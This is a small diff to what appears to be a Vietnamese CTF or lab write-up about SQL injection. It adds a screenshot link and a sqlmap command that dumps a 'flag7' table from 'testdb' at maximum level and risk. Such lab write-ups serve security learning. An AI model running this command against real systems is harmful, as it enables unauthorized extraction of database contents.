@@ -100,6 +100,7 @@ Tiếp theo là case7:
 
 ![image](https://github.com/user-attachments/assets/c727ed49-ae41-4577-85f4-47f8afc999c0)
 
+![image](https://github.com/user-attachments/assets/bba9e7d1-a381-4c97-ad3f-a1b62375bdd1)
 
-
+Lâu điênnn, à có thể dùng lệnh `sqlmap -r req.txt --batch --dump -T flag7 -D testdb --no-cast --level=5 --risk=3 --union-cols=5 --dbms=MySQL` cho chạy nhanh hơn!
 
